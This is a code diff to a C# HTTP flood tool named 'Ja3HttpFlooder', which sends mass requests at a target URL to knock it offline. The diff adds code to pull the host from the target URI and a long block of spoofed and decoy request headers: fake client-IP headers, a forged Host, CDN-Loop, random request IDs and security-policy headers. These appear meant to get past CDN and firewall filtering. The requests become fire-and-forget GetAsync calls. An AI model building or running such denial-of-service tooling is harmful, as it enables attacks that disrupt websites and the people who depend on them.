@@ -2,6 +2,19 @@
 
 public class Program
 {
+    private static string TakeHostFromURI(string uri)
+    {
+        try
+        {
+            Uri uriObject = new Uri(uri);
+            return uriObject.Host;
+        }
+        catch
+        {
+            return string.Empty;
+        }
+    }
+
     public static void Main(string[] args)
     {
         Console.Title = "Ja3HttpFlooder | Made by https://github.com/ZygoteCode/";
@@ -42,6 +55,8 @@ public class Program
                     handler.UseCookies = false;
                     handler.AllowAutoRedirect = true;
 
+                    string host = TakeHostFromURI(URI);
+
                     using (HttpClient client = new HttpClient(handler))
                     {
                         try
@@ -81,11 +96,48 @@ public class Program
                             client.DefaultRequestHeaders.Add("TE", "trailers");
                             client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
                             client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36");
-                            client.GetStringAsync(URI);
+
+                            client.DefaultRequestHeaders.Add("A-IM", "feed");
+                            client.DefaultRequestHeaders.Add("Accept-Charset", "utf-8");
+                            client.DefaultRequestHeaders.Add("Access-Control-Request-Method", "GET");
+                            client.DefaultRequestHeaders.Add("Access-Control-Request-Headers", "X-Custom-Header");
+                            client.DefaultRequestHeaders.Add("Date", DateTime.UtcNow.ToString("R"));
+                            client.DefaultRequestHeaders.Add("HTTP2-Settings", "token64");
+                            client.DefaultRequestHeaders.Add("If-Modified-Since", DateTime.UtcNow.AddDays(-7).ToString("R"));
+                            client.DefaultRequestHeaders.Add("Max-Forwards", "10");
+                            client.DefaultRequestHeaders.Add("Save-Data", "on");
+                            client.DefaultRequestHeaders.Add("Upgrade", "HTTP/2");
+                            client.DefaultRequestHeaders.Add("Accept-CH", "viewport-width, width");
+                            client.DefaultRequestHeaders.Add("Critical-CH", "viewport-width");
+                            client.DefaultRequestHeaders.Add("Downlink", "10");
+                            client.DefaultRequestHeaders.Add("ECT", "4g");
+                            client.DefaultRequestHeaders.Add("NEL", "{ \"report_to\": \"cf-nel\", \"max_age\": 3600 }");
+                            client.DefaultRequestHeaders.Add("Sec-CH-UA-Reduced", "?0");
+                            client.DefaultRequestHeaders.Add("Sec-Fetch-Storage-Access", "active");
+                            client.DefaultRequestHeaders.Add("Early-Data", "1");
+                            client.DefaultRequestHeaders.Add("Permissions-Policy", "geolocation=(self)");
+                            client.DefaultRequestHeaders.Add("X-Forwarded-For", "255.255.255.255");
+                            client.DefaultRequestHeaders.Add("X-Real-IP", "255.255.255.255");
+                            client.DefaultRequestHeaders.Add("True-Client-IP", "255.255.255.255");
+                            client.DefaultRequestHeaders.Add("X-Forwarded-Proto", "https");
+                            client.DefaultRequestHeaders.Add("X-Forwarded-Host", host);
+                            client.DefaultRequestHeaders.Add("Host", host);
+                            client.DefaultRequestHeaders.Add("X-Request-ID", Guid.NewGuid().ToString());
+                            client.DefaultRequestHeaders.Add("X-Correlation-ID", Guid.NewGuid().ToString());
+                            client.DefaultRequestHeaders.Add("CDN-Loop", "1");
+                            client.DefaultRequestHeaders.Add("Vary", "Accept-Encoding, User-Agent");
+                            client.DefaultRequestHeaders.Add("X-Content-Type-Options", "nosniff");
+                            client.DefaultRequestHeaders.Add("X-Frame-Options", "DENY");
+                            client.DefaultRequestHeaders.Add("X-XSS-Protection", "1; mode=block");
+                            client.DefaultRequestHeaders.Add("Content-Security-Policy", "default-src 'self'");
+                            client.DefaultRequestHeaders.Add("Content-Security-Policy-Report-Only", "default-src 'self'; report-uri /csp-report");
+                            client.DefaultRequestHeaders.Add("Referrer-Policy", "strict-origin-when-cross-origin");
+
+                            client.GetAsync(URI);
                         }
                         catch
                         {
-                            
+
                         }
                     }
                 }
